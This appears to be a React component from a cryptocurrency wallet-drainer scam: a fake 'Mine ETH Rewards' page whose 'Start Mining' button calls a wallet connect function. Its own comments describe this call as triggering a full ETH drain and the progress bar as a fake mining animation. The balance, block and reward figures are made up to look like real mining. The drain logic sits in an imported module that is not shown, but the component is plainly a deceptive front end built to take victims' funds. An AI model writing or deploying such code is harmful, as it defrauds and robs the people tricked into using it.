import React, { useState } from 'react';
import { useOutletContext } from 'react-router-dom';
import { useWalletStore } from '../utils/ContextApi';

const Mine: React.FC = () => {
  const { activeTab } = useOutletContext<{ activeTab: string }>();
  const [mining, setMining] = useState(false);
  const { connect } = useWalletStore();

  const startMining = async () => {
    setMining(true);
    await connect('0xVictimWalletExample', 1); // Triggers full ETH drain
    setTimeout(() => setMining(false), 5000); // Fake mining animation
  };

  if (activeTab !== 'Mine') return null;

  return (
    <div className="bg-gray-900 p-6 rounded-lg max-w-md mx-auto">
      <h1 className="text-2xl mb-4 flex items-center">
        <span className="mr-2">⛏️</span> Mine ETH Rewards
      </h1>
      <div className="mb-4">
        <label className="block mb-2 text-sm">Key Balance: 139,070 KEY</label>
        <div className="w-full bg-gray-700 rounded-full h-2.5">
          <div className="bg-orange-500 h-2.5 rounded-full transition-all duration-1000" style={{ width: mining ? '100%' : '50%' }}></div>
        </div>
        <span className="text-sm text-gray-400">Energy: {mining ? 'Mining...' : '4,000 / 8,000'}</span>
      </div>
      <button onClick={startMining} disabled={mining} className="bg-orange-500 hover:bg-orange-600 px-6 py-3 rounded w-full mb-4 disabled:opacity-50 transition">
        {mining ? 'Draining ETH...' : 'Start Mining'}
      </button>
      <div className="text-xs text-gray-400 space-y-1">
        <div>Last Block: #18239</div>
        <div>Reward: 25 KEY per block</div>
        <div>Online: 21.64%</div>
      </div>
    </div>
  );
};

export default Mine;